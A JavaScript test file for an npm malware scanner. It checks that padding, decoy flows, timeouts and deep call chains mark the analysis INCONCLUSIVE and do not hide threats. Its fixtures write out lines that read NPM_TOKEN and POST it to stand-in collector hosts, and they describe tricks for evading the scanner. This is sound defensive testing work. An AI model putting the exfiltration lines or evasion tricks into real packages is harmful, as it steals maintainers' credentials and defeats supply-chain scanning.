'use strict';

/**
 * Incompleteness contract (architecture lot 1).
 *
 * Every bound an attacker can fill to hide a verdict must either keep the
 * detection or mark the analysis INCONCLUSIVE - never a silent, complete,
 * lower verdict. Reproducers ported from the 2026-09-29 targeted audit
 * (edge padding, flow-quota decoys, module-graph timeout, function BFS bound).
 * Each malicious case failed on master before this change (score 28 -> 10 with
 * a COMPLETE-looking result, or the payload downgraded as unreachable).
 */

const fs = require('fs');
const path = require('path');
const os = require('os');
const { test, asyncTest, assert, runScanDirect } = require('../test-utils');
const { markIncomplete, getIncomplete, resetCompleteness, describe, MAX_ENTRIES } = require('../../src/shared/completeness');
const { generateSARIF } = require('../../src/output/sarif');
const { formatOutput } = require('../../src/output/formatter');
const { _internals } = require('../../src/scanner/reachability');

const COLLECTOR = "fetch('https://collector-unrelated.net/collect',{method:'POST',body:token});";

function makePkg(files, pkg = {}) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-incomplete-'));
  fs.writeFileSync(path.join(dir, 'package.json'),
    JSON.stringify({ name: 'incompleteness-fixture', version: '1.0.0', main: 'index.js', ...pkg }));
  for (const [rel, content] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
    fs.writeFileSync(path.join(dir, rel), content);
  }
  return dir;
}

function cleanup(dir) {
  fs.rmSync(dir, { recursive: true, force: true });
}

// index -> zsender -> zreader(secret) ; a-pad.js (sorted first) carries `pad` edges.
function edgeFixture(pad, malicious) {
  const files = {
    'index.js': "require('./zsender.js');",
    'zreader.js': malicious ? 'module.exports = process.env.NPM_TOKEN;' : "module.exports = 'health';",
    'zsender.js': "const token = require('./zreader.js'); " + COLLECTOR
  };
  files['a-pad.js'] = Array.from({ length: pad }, (_, i) => `require('./p${i}.js');`).join('\n');
  for (let i = 0; i < pad; i++) files[`p${i}.js`] = 'module.exports = 0;';
  return files;
}

// `decoys` cross-file flows to a first-party destination (filtered), sorted before the real one.
function flowQuotaFixture(decoys, malicious) {
  const files = {
    'index.js': "require('./zsender.js');",
    'reader.js': malicious ? 'module.exports = process.env.NPM_TOKEN;' : "module.exports = 'health';",
    'zsender.js': "const token = require('./reader.js'); " + COLLECTOR
  };
  for (let i = 0; i < decoys; i++) {
    files[`decoy${String(i).padStart(2, '0')}.js`] =
      "const token = require('./reader.js'); fetch('https://example.com/collect',{method:'POST',body:token});";
  }
  return files;
}

function hasType(result, type) {
  return result.threats.some(t => t.type === type);
}

function reasons(result) {
  return result.analysis.incomplete.map(e => `${e.component}/${e.reason}`);
}

async function withEnv(name, value, fn) {
  const prev = process.env[name];
  process.env[name] = value;
  try { return await fn(); } finally {
    if (prev === undefined) delete process.env[name]; else process.env[name] = prev;
  }
}

async function runIncompletenessTests() {
  console.log('\n=== Incompleteness contract (architecture lot 1) ===\n');

  // --- collector -----------------------------------------------------------

  test('INCOMPLETE: collector dedups (component, reason) and is bounded', () => {
    resetCompleteness();
    markIncomplete('moduleGraph', 'edge-limit', { limit: 400, observed: 401 });
    markIncomplete('moduleGraph', 'edge-limit', { limit: 400, observed: 999 });
    assert(getIncomplete().length === 1, 'duplicate entry must be dropped');
    for (let i = 0; i < MAX_ENTRIES + 10; i++) markIncomplete('c' + i, 'r');
    assert(getIncomplete().length === MAX_ENTRIES, 'record must be bounded by MAX_ENTRIES');
    resetCompleteness();
    assert(getIncomplete().length === 0, 'reset must clear the record');
  });

  test('INCOMPLETE: describe() renders limit and observed', () => {
    assert(describe({ component: 'moduleGraph', reason: 'edge-limit', limit: 400, observed: 401 })
      === 'moduleGraph: edge-limit (limit 400, observed 401)', 'unexpected rendering');
    assert(describe({ component: 'files', reason: 'file-cap' }) === 'files: file-cap', 'no-detail rendering');
  });

  // --- baseline: no bound -> COMPLETE ----------------------------------------

  await asyncTest('INCOMPLETE: small package without any bound is COMPLETE', async () => {
    const dir = makePkg(edgeFixture(5, true));
    try {
      const r = await runScanDirect(dir);
      assert(r.analysis && r.analysis.status === 'COMPLETE', 'expected COMPLETE, got ' + JSON.stringify(r.analysis));
      assert(r.summary.analysisStatus === 'COMPLETE', 'summary.analysisStatus must mirror analysis.status');
      assert(r.analysis.incomplete.length === 0, 'no incomplete entry expected');
      assert(hasType(r, 'cross_file_dataflow'), 'control: the cross-file flow must be found');
    } finally { cleanup(dir); }
  });

  // --- edge limit (padding before source/sink) --------------------------------

  await asyncTest('INCOMPLETE: 401+ padded edges -> flow kept or INCONCLUSIVE (never a silent loss)', async () => {
    const dir = makePkg(edgeFixture(420, true));
    try {
      const r = await runScanDirect(dir);
      const flagged = r.analysis.status === 'INCONCLUSIVE' && reasons(r).includes('moduleGraph/edge-limit');
      assert(hasType(r, 'cross_file_dataflow') || flagged,
        'edge padding hid the flow without marking the analysis INCONCLUSIVE: ' + JSON.stringify(r.analysis));
      assert(flagged, 'edge limit reached must be reported: ' + JSON.stringify(r.analysis));
    } finally { cleanup(dir); }
  });

  await asyncTest('INCOMPLETE: 300 edges (under the limit) stays COMPLETE with the flow', async () => {
    const dir = makePkg(edgeFixture(300, true));
    try {
      const r = await runScanDirect(dir);
      assert(!reasons(r).includes('moduleGraph/edge-limit'), 'edge limit must not be reported under the bound');
      assert(hasType(r, 'cross_file_dataflow'), 'flow must be found under the bound');
    } finally { cleanup(dir); }
  });

  // --- flow quota applied after the destination filter ------------------------

  await asyncTest('INCOMPLETE: 20 filtered decoys do not consume the flow quota', async () => {
    const dir = makePkg(flowQuotaFixture(20, true));
    try {
      const r = await runScanDirect(dir);
      const flows = r.threats.filter(t => t.type === 'cross_file_dataflow');
      assert(flows.some(t => /zsender\.js/.test(t.file) || /zsender/.test(t.message || '')),
        'real flow to the unknown collector must survive 20 first-party decoys: ' +
        JSON.stringify(flows.map(f => f.message)));
      assert(r.analysis.status === 'COMPLETE', '20 candidates are below the candidate bound');
    } finally { cleanup(dir); }
  });

  // `kept` cross-file flows to third-party collectors: they survive the destination filter.
  const keptFlowsFixture = (kept) => {
    const files = { 'index.js': "require('./s00.js');", 'reader.js': 'module.exports = process.env.NPM_TOKEN;' };
    for (let i = 0; i < kept; i++) {
      files[`s${String(i).padStart(2, '0')}.js`] =
        `const token = require('./reader.js'); fetch('https://collector-${i}.net/c',{method:'POST',body:token});`;
    }
    return files;
  };

  await asyncTest('INCOMPLETE: more than MAX_FLOWS flows after the filter -> INCONCLUSIVE flow-limit', async () => {
    const dir = makePkg(keptFlowsFixture(25));
    try {
      const r = await runScanDirect(dir);
      const flows = r.threats.filter(t => t.type === 'cross_file_dataflow');
      assert(flows.length <= 20, 'published flows stay capped at MAX_FLOWS, got ' + flows.length);
      assert(r.analysis.status === 'INCONCLUSIVE' && reasons(r).includes('moduleGraph/flow-limit'),
        'flows dropped past the quota must be reported: ' + JSON.stringify(r.analysis));
    } finally { cleanup(dir); }
  });

  await asyncTest('INCOMPLETE: exactly MAX_FLOWS flows after the filter stays COMPLETE', async () => {
    const dir = makePkg(keptFlowsFixture(20));
    try {
      const r = await runScanDirect(dir);
      assert(r.threats.filter(t => t.type === 'cross_file_dataflow').length > 0, 'control: flows must be found');
      assert(!reasons(r).includes('moduleGraph/flow-limit'), 'flow-limit must not be reported at the quota: ' +
        JSON.stringify(r.analysis));
    } finally { cleanup(dir); }
  });

  await asyncTest('INCOMPLETE: 20 decoys alone (first-party destination) yield no cross-file flow', async () => {
    const dir = makePkg(flowQuotaFixture(20, false));
    try {
      const r = await runScanDirect(dir);
      const flows = r.threats.filter(t => t.type === 'cross_file_dataflow');
      assert(flows.every(t => !/decoy/.test(t.file || '')), 'decoys to example.com must stay filtered');
    } finally { cleanup(dir); }
  });

  // --- module-graph timeout: frozen, filtered, INCONCLUSIVE --------------------

  await asyncTest('INCOMPLETE: module-graph timeout is deterministic and INCONCLUSIVE', async () => {
    await withEnv('MUADDIB_MODULE_GRAPH_TIMEOUT_MS', '0', async () => {
      const seen = new Set();
      for (let i = 0; i < 5; i++) {
        const dir = makePkg(edgeFixture(5, true));
        try {
          const r = await runScanDirect(dir);
          assert(r.analysis.status === 'INCONCLUSIVE', 'timeout must make the analysis INCONCLUSIVE');
          assert(reasons(r).includes('moduleGraph/timeout'), 'timeout reason expected: ' + JSON.stringify(r.analysis));
          seen.add(r.summary.riskScore + ':' + r.threats.map(t => t.type).sort().join(','));
        } finally { cleanup(dir); }
      }
      assert(seen.size === 1, 'verdict must not depend on scheduling: ' + [...seen].join(' | '));
    });
  });

  await asyncTest('INCOMPLETE: timeout never publishes an unfiltered first-party flow (no 10 -> 28)', async () => {
    await withEnv('MUADDIB_MODULE_GRAPH_TIMEOUT_MS', '0', async () => {
      const dir = makePkg(flowQuotaFixture(3, false));
      try {
        const r = await runScanDirect(dir);
        assert(!r.threats.some(t => t.type === 'cross_file_dataflow' && /decoy/.test(t.file || '')),
          'a first-party candidate leaked past the filter on timeout');
      } finally { cleanup(dir); }
    });
  });

  await asyncTest('INCOMPLETE: empty or malformed MUADDIB_MODULE_GRAPH_TIMEOUT_MS keeps the 5 s default', async () => {
    for (const value of ['', ' ', 'abc', '-1', '1e3', '5s']) {
      const dir = makePkg(edgeFixture(5, true));
      try {
        const r = await withEnv('MUADDIB_MODULE_GRAPH_TIMEOUT_MS', value, () => runScanDirect(dir));
        assert(!reasons(r).includes('moduleGraph/timeout'),
          `value ${JSON.stringify(value)} must not become a 0 ms budget: ` + JSON.stringify(r.analysis));
        assert(hasType(r, 'cross_file_dataflow'), `value ${JSON.stringify(value)}: cross-file analysis must still run`);
      } finally { cleanup(dir); }
    }
  });

  await asyncTest('INCOMPLETE: concurrent scans in one process keep separate records (muaddib watch)', async () => {
    // A hits the edge limit, B hits nothing. Started together, in both orders: B's
    // start must not wipe A's entry (false COMPLETE) and A's entry must not leak into B.
    for (const order of ['AB', 'BA']) {
      const a = makePkg(edgeFixture(420, true));
      const b = makePkg(edgeFixture(5, true));
      try {
        const scans = order === 'AB' ? [runScanDirect(a), runScanDirect(b)] : [runScanDirect(b), runScanDirect(a)];
        const done = await Promise.all(scans);
        const ra = order === 'AB' ? done[0] : done[1];
        const rb = order === 'AB' ? done[1] : done[0];
        assert(ra.analysis.status === 'INCONCLUSIVE' && reasons(ra).includes('moduleGraph/edge-limit'),
          `${order}: bounded scan lost its INCONCLUSIVE status: ` + JSON.stringify(ra.analysis));
        assert(rb.analysis.status === 'COMPLETE',
          `${order}: unbounded scan inherited another scan's record: ` + JSON.stringify(rb.analysis));
      } finally { cleanup(a); cleanup(b); }
    }
  });

  // --- function BFS bound: abstain instead of "dead code" ----------------------

  function chain(count) {
    return 'function payload(){ return process.env.NPM_TOKEN; }\n' +
      Array.from({ length: count }, (_, i) => `function f${i}(){ ${i < count - 1 ? `f${i + 1}();` : 'payload();'} }`).join('\n') +
      '\nf0();';
  }

  test('INCOMPLETE: function BFS bound -> no function declared dead, INCONCLUSIVE', () => {
    resetCompleteness();
    const r = _internals._analyzeFunctionReachability(_internals._parseWithLocations(chain(5002)));
    assert(r.deadRanges.length === 0, 'payload past the BFS bound was classified dead: ' + JSON.stringify(r.deadRanges));
    assert(r.bfsTruncated === true, 'bfsTruncated flag expected');
    assert(getIncomplete().some(e => e.component === 'reachability' && e.reason === 'function-bfs-limit'),
      'BFS bound must be recorded');
    resetCompleteness();
  });

  test('INCOMPLETE: function chain under the BFS bound is unchanged and COMPLETE', () => {
    resetCompleteness();
    const r = _internals._analyzeFunctionReachability(_internals._parseWithLocations(chain(4999)));
    assert(r.deadRanges.length === 0, 'every function in the chain is live');
    assert(!r.bfsTruncated, 'no truncation under the bound');
    assert(getIncomplete().length === 0, 'nothing recorded under the bound');
    const dead = _internals._analyzeFunctionReachability(_internals._parseWithLocations(
      'function used(){}\nfunction unused(){ return 1; }\nused();'));
    assert(dead.deadRanges.length === 1 && dead.deadRanges[0].name === 'unused',
      'genuinely dead function must still be reported dead');
  });

  // --- outputs ------------------------------------------------------------------

  test('INCOMPLETE: SARIF flags an INCONCLUSIVE run with error-level notifications (Appendix I)', () => {
    const sarif = generateSARIF({
      threats: [],
      analysis: { status: 'INCONCLUSIVE', incomplete: [{ component: 'moduleGraph', reason: 'edge-limit', limit: 400, observed: 401 }] }
    });
    const inv = sarif.runs[0].invocations[0];
    // The scan ran to completion: executionSuccessful=false is reserved for a tool
    // that failed to start or crashed (SARIF 2.1.0 §3.20.14).
    assert(inv.executionSuccessful === true, 'executionSuccessful must stay true');
    assert(inv.toolExecutionNotifications.length === 1, 'one notification per incomplete entry');
    assert(inv.toolExecutionNotifications[0].level === 'error',
      'level "error" is the SARIF signal that results cannot be assumed complete');
    assert(inv.toolExecutionNotifications[0].descriptor.id === 'incomplete/moduleGraph/edge-limit', 'descriptor id');
    const ok = generateSARIF({ threats: [], analysis: { status: 'COMPLETE', incomplete: [] } });
    assert(ok.runs[0].invocations[0].executionSuccessful === true, 'COMPLETE run is successful');
    assert(!ok.runs[0].invocations[0].toolExecutionNotifications, 'no notification on COMPLETE');
  });

  function captureCli(result) {
    const lines = [];
    const orig = console.log;
    console.log = (...a) => lines.push(a.join(' '));
    try {
      formatOutput(result, {}, {
        spinner: null, sandboxData: null, mostSuspiciousFile: null, maxFileScore: 0, packageScore: 0,
        globalRiskScore: 0, deduped: [], enrichedThreats: [], pythonInfo: null, breakdown: [], targetPath: 'x'
      });
    } finally { console.log = orig; }
    return lines.join('\n');
  }

  test('INCOMPLETE: CLI never prints SAFE / [OK] for an INCONCLUSIVE scan', () => {
    const out = captureCli({
      summary: { riskScore: 0, riskLevel: 'SAFE' },
      analysis: { status: 'INCONCLUSIVE', incomplete: [{ component: 'moduleGraph', reason: 'timeout', limit: 5000 }] }
    });
    assert(!/\bSAFE\b(?!\.)/.test(out.replace('INCONCLUSIVE, not SAFE', '')), 'SAFE label printed: ' + out);
    assert(!out.includes('[OK] No threats detected'), '[OK] printed for an INCONCLUSIVE scan');
    assert(out.includes('[ANALYSIS] INCONCLUSIVE'), 'status banner expected');
    assert(out.includes('moduleGraph: timeout'), 'reason expected');
  });

  function cliExit(dir, args, env) {
    const { spawnSync } = require('child_process');
    const bin = path.join(__dirname, '..', '..', 'bin', 'muaddib.js');
    const r = spawnSync(process.execPath, [bin, 'scan', dir, ...args], {
      encoding: 'utf8', env: { ...process.env, MUADDIB_NO_REGISTRY_FETCH: '1', ...env }
    });
    return r.status;
  }

  test('INCOMPLETE: --fail-on-inconclusive makes an INCONCLUSIVE scan exit non-zero (fail closed)', () => {
    const dir = makePkg({ 'index.js': 'module.exports = 1;' });
    try {
      const timeout = { MUADDIB_MODULE_GRAPH_TIMEOUT_MS: '0' };
      assert(cliExit(dir, [], timeout) === 0, 'default exit code must stay unchanged (0) for an INCONCLUSIVE clean scan');
      assert(cliExit(dir, ['--fail-on-inconclusive'], timeout) === 1, 'opt-in must fail closed (exit 1)');
      assert(cliExit(dir, ['--fail-on-inconclusive', '--fail-on', 'none'], timeout) === 1,
        '--fail-on none must not silence --fail-on-inconclusive');
      assert(cliExit(dir, ['--fail-on-inconclusive'], {}) === 0, 'COMPLETE scan with the opt-in still exits 0');
    } finally { cleanup(dir); }
  });

  await asyncTest('INCOMPLETE: HTML report shows the INCONCLUSIVE banner and no clean panel', async () => {
    const { generateHTML } = require('../../src/output/report');
    const dir = makePkg({ 'index.js': 'module.exports = 1;' });
    try {
      const inc = await withEnv('MUADDIB_MODULE_GRAPH_TIMEOUT_MS', '0', () => runScanDirect(dir));
      const html = generateHTML(inc);
      assert(html.includes('Analysis INCONCLUSIVE'), 'banner expected');
      assert(html.includes('moduleGraph: timeout'), 'reason expected');
      assert(!html.includes('<div class="ok">No threats detected</div>'), 'clean panel must not be shown');
      const ok = generateHTML(await runScanDirect(dir));
      assert(ok.includes('<div class="ok">No threats detected</div>'), 'COMPLETE clean scan keeps the clean panel');
      assert(!ok.includes('Analysis INCONCLUSIVE'), 'no banner on a COMPLETE scan');
    } finally { cleanup(dir); }
  });

  test('INCOMPLETE: GitHub Action reporter exposes analysis_status', () => {
    const { execFileSync } = require('child_process');
    const reporter = path.join(__dirname, '..', '..', 'scripts', 'action-report.cjs');
    const run = (payload) => {
      const d = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-inc-action-'));
      try {
        fs.writeFileSync(path.join(d, 'r.json'), JSON.stringify(payload));
        fs.writeFileSync(path.join(d, 'o.txt'), '');
        const stdout = execFileSync(process.execPath, [reporter, path.join(d, 'r.json')],
          { env: { ...process.env, GITHUB_OUTPUT: path.join(d, 'o.txt') }, encoding: 'utf8' });
        return { stdout, out: fs.readFileSync(path.join(d, 'o.txt'), 'utf8') };
      } finally { cleanup(d); }
    };
    const inc = run({ summary: { riskScore: 0, riskLevel: 'SAFE' }, threats: [],
      analysis: { status: 'INCONCLUSIVE', incomplete: [{ component: 'moduleGraph', reason: 'edge-limit', limit: 400 }] } });
    assert(/analysis_status=INCONCLUSIVE/.test(inc.out), 'analysis_status output expected');
    assert(inc.stdout.includes('INCONCLUSIVE') && inc.stdout.includes('moduleGraph: edge-limit'), 'log line expected');
    const old = run({ summary: { riskScore: 0, riskLevel: 'SAFE' }, threats: [] });
    assert(/analysis_status=UNKNOWN/.test(old.out), 'older scanner output maps to UNKNOWN, not COMPLETE');
  });

  test('INCOMPLETE: CLI output of a COMPLETE scan is unchanged', () => {
    const out = captureCli({ summary: { riskScore: 0, riskLevel: 'SAFE' }, analysis: { status: 'COMPLETE', incomplete: [] } });
    assert(/\] SAFE/.test(out), 'SAFE label expected on a COMPLETE scan');
    assert(out.includes('[OK] No threats detected.'), '[OK] expected');
    assert(!out.includes('[ANALYSIS]'), 'no banner on a COMPLETE scan');
  });
}

module.exports = { runIncompletenessTests };
